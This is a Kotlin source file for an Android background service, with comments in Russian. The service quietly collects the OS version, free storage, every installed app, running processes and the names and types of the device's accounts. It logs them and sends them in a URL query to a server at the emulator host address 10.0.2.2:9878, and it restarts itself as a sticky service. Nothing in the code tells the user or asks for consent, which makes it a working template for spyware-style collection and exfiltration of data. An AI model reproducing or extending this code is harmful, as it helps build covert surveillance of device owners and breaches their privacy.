package com.example.service_collector

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import android.os.Environment
import android.accounts.Account
import android.accounts.AccountManager
import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.content.pm.PackageInfo
import java.io.BufferedInputStream
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader

class BackgroundService : Service() {

    private val TAG = "BackgroundService"

    private fun sendDataToServer(data: String) {
        val serverUrl = "http://10.0.2.2:9878"
        val url = URL("$serverUrl?data=$data")

        Thread {
            try {
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"

                if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                    val response = BufferedInputStream(connection.inputStream).bufferedReader().use { it.readText() }

                    Log.d(TAG, "Ответ сервера: $response")
                } else {

                    Log.e(TAG, "Ошибка подключения к серверу. Код ответа: ${connection.responseCode}")
                }
                connection.disconnect()
            } catch (e: IOException) {
                Log.e(TAG, "Исключение: ${e.message}")
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

        // Сбор системной информации
        val version = android.os.Build.VERSION.RELEASE
        val sdkVersion = android.os.Build.VERSION.SDK_INT
        val freeSpace = Environment.getExternalStorageDirectory().freeSpace

        val packageManager = packageManager
        val installedApps = packageManager.getInstalledPackages(PackageManager.GET_META_DATA)

        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val runningProcesses = activityManager.runningAppProcesses

        val accountManager = AccountManager.get(this)
        val accounts = accountManager.accounts

        val stringBuilder = StringBuilder()
        stringBuilder.append("&Version: $version |\n")
        stringBuilder.append("&SDK Version: $sdkVersion |\n")
        stringBuilder.append("&Free Space: $freeSpace |\n")

        stringBuilder.append("&Installed Apps: |\n")
        for (app in installedApps) {
            stringBuilder.append(app.packageName).append("|\n")
        }

        stringBuilder.append("&Running Processes: |\n")
        for (process in runningProcesses) {
            stringBuilder.append(process.processName).append("|\n")
        }

        stringBuilder.append("&Accounts: |\n")
        for (acc in accounts) {
            stringBuilder.append("Name: ${acc.name}, Type: ${acc.type}\n")
        }

        // Вывод собранной информации
        Log.d(TAG, "======\nVersion: $version")
        Log.d(TAG, "======\nSDK Version: $sdkVersion")
        Log.d(TAG, "======\nFree Space: $freeSpace")

        Log.d(TAG, "======\nInstalled Apps:")
        for (app in installedApps) {
            Log.d(TAG, app.packageName)
        }

        Log.d(TAG, "======\nRunning Processes:")
        for (process in runningProcesses) {
            Log.d(TAG, process.processName)
        }

        Log.d(TAG, "======\nAccounts:")
        for (acc in accounts) {
            Log.d(TAG, "Name: " + acc.name + ", Type: " + acc.type)
        }
        sendDataToServer(stringBuilder.toString())
        Log.d(TAG, "======\n")
        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }
}
